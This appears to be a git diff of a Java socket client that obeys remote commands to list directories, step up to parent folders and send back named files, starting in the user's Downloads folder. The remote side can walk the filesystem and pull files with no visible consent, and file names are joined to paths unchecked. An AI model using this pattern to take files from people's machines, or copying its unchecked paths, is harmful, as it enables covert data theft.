@@ -71,6 +71,9 @@ public class Client {
                 } else if (input.contains("FILELIST")) {
                     communicate("FILELIST");
                     sendFileList();
+                } else if (input.contains("DIRECTORYUP")){
+                    communicate("DIRECTORYUP");
+                    directoryUp();
                 } else if (input.contains("DOWNLOAD")) {
                     communicate("DOWNLOAD");
                     sendFile();
@@ -158,12 +161,19 @@ public class Client {
         mauscs.delete();
     }
 
+    private void directoryUp(){
+        if(directory != null) {
+            directory = directory.getParentFile();
+        }
+    }
     private void sendFileList() {
-        String directory = System.getProperty("user.home") + "/Downloads/";
-        this.directory = new File(directory);
-        this.directory.isDirectory();
-        File[] files = new File(directory).listFiles();
-        communicate(directory);
+        if(this.directory == null) {
+            String directory = System.getProperty("user.home") + "/Downloads/";
+            this.directory = new File(directory);
+            this.directory.isDirectory();
+        }
+        File[] files = new File(directory.getAbsolutePath()).listFiles();
+        communicate(directory.getAbsolutePath());
         assert files != null;
         communicate(files.length);
         for (File file : files) {
@@ -174,14 +184,10 @@ public class Client {
     }
 
     private void sendFile() {
-        try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
-             DataOutputStream dos = new DataOutputStream(bos);
-             BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());
-             DataInputStream dis = new DataInputStream(bis)) {
+        try (DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
+             DataInputStream dis = new DataInputStream(socket.getInputStream())) {
             String fileName = dis.readUTF();
-            String saveLocation = dis.readUTF();
-            dos.writeUTF(saveLocation);
-            File filetoDownload = new File(fileName);
+            File filetoDownload = new File(directory.getAbsolutePath() + "/" +fileName);
             Long length = filetoDownload.length();
             dos.writeLong(length);
             dos.writeUTF(fileName);
@@ -191,11 +197,8 @@ public class Client {
 
             int fbyte;
             while ((fbyte = bs.read()) != -1) {
-                bos.write(fbyte);
+                dos.writeInt(fbyte);
             }
-            bs.close();
-            dos.close();
-
         } catch (IOException e) {
             e.printStackTrace();
         }
